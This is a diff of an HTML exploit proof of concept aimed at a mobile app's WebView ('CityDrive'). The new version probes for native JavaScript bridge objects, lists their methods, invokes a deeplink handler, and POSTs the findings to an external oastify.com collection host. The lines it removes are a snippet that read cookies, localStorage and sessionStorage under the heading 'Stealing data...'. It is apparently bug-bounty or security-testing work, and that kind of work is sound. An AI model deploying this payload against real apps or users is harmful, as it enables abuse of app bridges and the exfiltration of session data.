@@ -1,21 +1,45 @@
 <html>
 <body>
-<h1>Stealing data...</h1>
+<h1>CityDrive Exploit PoC</h1>
 <div id="output"></div>
 <script>
 const output = document.getElementById('output');
+const results = {};
 
-const stolen = {
-    cookies: document.cookie,
-    localStorage: JSON.stringify(localStorage),
-    sessionStorage: JSON.stringify(sessionStorage),
-    userAgent: navigator.userAgent,
-    location: window.location.href
+results.interfaces = {
+    WebViewInterface: typeof window.WebViewInterface,
+    Gate: typeof window.Gate,
+    Android: typeof window.Android,
+    Native: typeof window.Native
 };
 
-output.innerHTML = '<h2>Stolen Data:</h2><pre>' + 
-    JSON.stringify(stolen, null, 2) + '</pre>';
+if (window.WebViewInterface) {
+    results.methods = [];
+    for (let key in window.WebViewInterface) {
+        results.methods.push(key);
+    }
+    try {
+        window.WebViewInterface.handleDeeplink("profile");
+        results.handleDeeplink = "SUCCESS - navigated to profile";
+    } catch(e) {
+        results.handleDeeplink_error = e.toString();
+    }
+}
 
+if (window.Gate) {
+    results.gate_methods = [];
+    for (let key in window.Gate) {
+        results.gate_methods.push(key);
+    }
+}
+
+output.innerHTML = '<pre>' + JSON.stringify(results, null, 2) + '</pre>';
+
+fetch('https://8jsfvy44qbgemit855hygopndej57wzko.oastify.com', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(results)
+});
 </script>
 </body>
 </html>
